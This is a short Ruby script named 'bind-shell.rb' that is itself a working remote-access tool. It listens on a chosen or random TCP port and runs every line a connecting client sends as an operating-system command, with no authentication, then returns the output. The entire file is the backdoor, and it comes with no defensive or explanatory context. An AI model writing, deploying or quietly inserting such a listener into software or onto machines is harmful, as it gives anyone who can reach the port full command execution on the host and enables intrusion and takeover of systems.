#!/usr/bin/ruby
#Snippet: bind-shell.rb
require 'socket'

#Main function: Bind shell
def bind_shell(port)
    puts "[*] Starting bind shell on port #{port}..."
    server = TCPServer.new(port)
    loop do
        client = server.accept
        puts "[*] Connection established from #{client.peeraddr[3]}"
        client.puts "Welcome to esh (eldritch-shell). Type 'exit' to close the connection."
        loop do
            client.print "> "
            command = client.gets&.chomp
            break if command.nil? || command.downcase == 'exit'
            output = `#{command}` rescue "Error executing command"
            client.puts output.empty? ? "No output" : output
        end
        puts "[*] Connection closed."
        client.close
    end
end

#Defaults and user input
port = (ARGV[0] || rand(49152..65535)).to_i
bind_shell(port)
